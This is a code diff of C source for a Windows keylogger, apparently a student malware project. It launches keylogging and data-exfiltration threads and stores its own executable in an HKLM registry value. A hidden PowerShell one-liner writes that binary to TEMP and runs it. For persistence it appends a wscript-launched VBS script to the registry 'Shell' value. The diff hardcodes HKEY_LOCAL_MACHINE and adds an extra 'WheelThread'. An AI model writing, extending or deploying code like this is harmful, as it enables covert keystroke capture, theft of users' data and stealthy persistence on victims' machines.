@@ -1,13 +1,10 @@
-/*
-Author: Bryant Chang
-Emial: bc9028@rit.edu
-*/
 #include <winsock2.h>
 #include "libs/winexfil.h"
 #include "winconsts.h"
 #include "libs/winkeylog.h"
 #include "libs/winencode.h"
 #include "libs/winvbs.h"
+#include "gamble.c"
 #include <windows.h>
 #include <stdio.h>
 
@@ -19,17 +16,19 @@ int isInRegistry() {
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
     char cmd[512];
 	snprintf(cmd, sizeof(cmd), 
-    	"$b=(Get-ItemProperty 'Registry::%s\\%s').DEBUG;"
+    	"$b=(Get-ItemProperty 'Registry::HKEY_LOCAL_MACHINE\\%s').DEBUG;"
     	"$p=\"$env:TEMP\\%s\";[IO.File]::WriteAllBytes($p,$b);"
-    	"Start-Process $p -WindowStyle Hidden", REG_STR, MAIN_REGISTRY, PROC_NAME);
+    	"Start-Process $p -WindowStyle Hidden", MAIN_REGISTRY, PROC_NAME);
 	const char* encodedPayload = encodeForPowerShell(cmd);
     if (isInRegistry()) {
 		if (!hasVBS()) { dropVBS(encodedPayload); }
         HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)logKey, NULL, 0, NULL);
 		HANDLE hExfilThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exfilThread, NULL, 0, NULL);
+        HANDLE hWheelThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WheelThread, NULL, 0, NULL);
 		WaitForSingleObject(hThread, INFINITE);
 		return 0;
 	}
+    // write entire exe to registry
     char szPath[MAX_PATH];
     GetModuleFileNameA(NULL, szPath, MAX_PATH);
     FILE* file = fopen(szPath, "rb");
@@ -41,15 +40,16 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     fread(buffer, 1, fileSize, file);
     fclose(file);
     HKEY hKey;
-    if (RegCreateKeyExA(REG, MAIN_REGISTRY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, MAIN_REGISTRY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
         RegSetValueExA(hKey, "DEBUG", 0, REG_BINARY, buffer, fileSize);
         RegCloseKey(hKey);
     }
     free(buffer);
+    // create vbs and write to registry
     dropVBS(encodedPayload);
     char currentShell[512], newShell[1024];
     DWORD dwSize = sizeof(currentShell);
-    if (RegOpenKeyExA(REG, ACTIVATE_REGISTRY, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, ACTIVATE_REGISTRY, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
         if (RegQueryValueExA(hKey, "Shell", NULL, NULL, (LPBYTE)currentShell, &dwSize) == ERROR_SUCCESS) {
             if (strstr(currentShell, "wininit.ini.vbs") == NULL) {
                 snprintf(newShell, sizeof(newShell), "%s, wscript.exe \"%s\"", currentShell, VBS_PATH);
